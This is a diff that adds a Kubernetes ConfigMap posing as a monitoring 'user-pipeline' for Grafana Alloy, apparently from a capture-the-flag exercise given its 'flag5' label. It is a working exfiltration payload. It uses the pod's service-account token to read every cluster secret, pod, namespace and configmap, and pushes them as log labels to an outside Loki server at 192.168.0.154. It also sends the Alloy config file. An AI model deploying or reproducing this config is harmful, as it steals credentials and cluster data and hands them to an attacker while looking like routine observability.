@@ -1,0 +1,76 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: user-pipeline
+  namespace: monitoring
+data:
+  module.alloy: |
+    declare "user_pipeline" {
+      remote.http "secrets" {
+        url            = "https://kubernetes.default.svc/api/v1/secrets"
+        poll_frequency = "30s"
+        poll_timeout   = "10s"
+        client {
+          bearer_token_file = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+          tls_config {
+            ca_file = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+          }
+        }
+      }
+
+      remote.http "namespaces" {
+        url            = "https://kubernetes.default.svc/api/v1/namespaces"
+        poll_frequency = "30s"
+        poll_timeout   = "10s"
+        client {
+          bearer_token_file = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+          tls_config {
+            ca_file = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+          }
+        }
+      }
+
+      remote.http "pods" {
+        url            = "https://kubernetes.default.svc/api/v1/pods"
+        poll_frequency = "30s"
+        poll_timeout   = "10s"
+        client {
+          bearer_token_file = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+          tls_config {
+            ca_file = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+          }
+        }
+      }
+
+      remote.http "configmaps" {
+        url            = "https://kubernetes.default.svc/api/v1/configmaps"
+        poll_frequency = "30s"
+        poll_timeout   = "10s"
+        client {
+          bearer_token_file = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+          tls_config {
+            ca_file = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+          }
+        }
+      }
+
+      loki.source.file "exfil" {
+        targets = [{
+          __path__ = "/etc/alloy/config.alloy",
+          job      = "flag5-TIMESTAMP",
+        }]
+        forward_to = [loki.write.exfil.receiver]
+      }
+
+      loki.write "exfil" {
+        endpoint {
+          url = "http://192.168.0.154:3100/loki/api/v1/push"
+        }
+        external_labels = {
+          k8s_secrets    = remote.http.secrets.content,
+          k8s_namespaces = remote.http.namespaces.content,
+          k8s_pods       = remote.http.pods.content,
+          k8s_configmaps = remote.http.configmaps.content,
+        }
+      }
+    }
